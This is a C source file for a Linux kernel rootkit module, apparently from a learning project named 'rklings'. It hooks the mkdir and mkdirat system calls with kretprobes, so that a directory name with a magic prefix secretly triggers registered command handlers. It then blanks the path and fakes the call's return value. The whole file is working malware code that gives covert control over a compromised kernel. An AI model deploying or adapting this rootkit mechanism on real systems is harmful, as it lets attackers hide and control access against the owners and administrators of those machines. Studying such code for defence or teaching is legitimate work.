// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128

static struct rk_cmd_entry registry[RK_CMD_MAX];
static int nr_cmds;

int rk_cmd_register(const char *key, rk_handler_t handler)
{
	if (nr_cmds >= RK_CMD_MAX)
		return -ENOSPC;
	registry[nr_cmds].key = key;
	registry[nr_cmds].handler = handler;
	nr_cmds++;
	return 0;
}

int rk_cmds_register(const struct rk_cmd_entry *cmds, int n)
{
	int i, ret;

	for (i = 0; i < n; i++) {
		ret = rk_cmd_register(cmds[i].key, cmds[i].handler);
		if (ret)
			return ret;
	}
	return 0;
}

int rk_dispatch(const char *name)
{
	const char *suffix = name + RK_PREFIX_LEN;
	const struct rk_cmd_entry *best = NULL;
	int best_len = 0;
	int i;

	for (i = 0; i < nr_cmds; i++) {
		int klen = strlen(registry[i].key);

		if (strncmp(suffix, registry[i].key, klen) != 0)
			continue;
		if (suffix[klen] != '\0' && suffix[klen] != '.')
			continue;
		if (klen > best_len) {
			best = &registry[i];
			best_len = klen;
		}
	}

	if (!best)
		return -ENOENT;

	if (suffix[best_len] == '.')
		return best->handler(suffix + best_len + 1);
	return best->handler(NULL);
}

/* Kretprobe interception of mkdir/mkdirat syscalls */

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_do_entry(struct kretprobe_instance *inst,
		       const char __user *pathname)
{
	struct rk_mkdir_data *data = (struct rk_mkdir_data *)inst->data;
	char buf[RK_PATH_MAX];
	long copied;

	data->intercepted = false;

	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	if (strncmp(buf, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(buf);
	data->intercepted = true;
	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_entry(struct kretprobe_instance *inst, struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_do_entry(inst, (const char __user *)uregs->di);
}

static int rk_mkdirat_entry(struct kretprobe_instance *inst,
			    struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_do_entry(inst, (const char __user *)uregs->si);
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_mkdir_data *data = (struct rk_mkdir_data *)inst->data;

	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

struct kretprobe rk_mkdir_probe = {
    .kp.symbol_name = "__x64_sys_mkdir",
    .entry_handler = rk_mkdir_entry,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

struct kretprobe rk_mkdirat_probe = {
    .kp.symbol_name = "__x64_sys_mkdirat",
    .entry_handler = rk_mkdirat_entry,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};
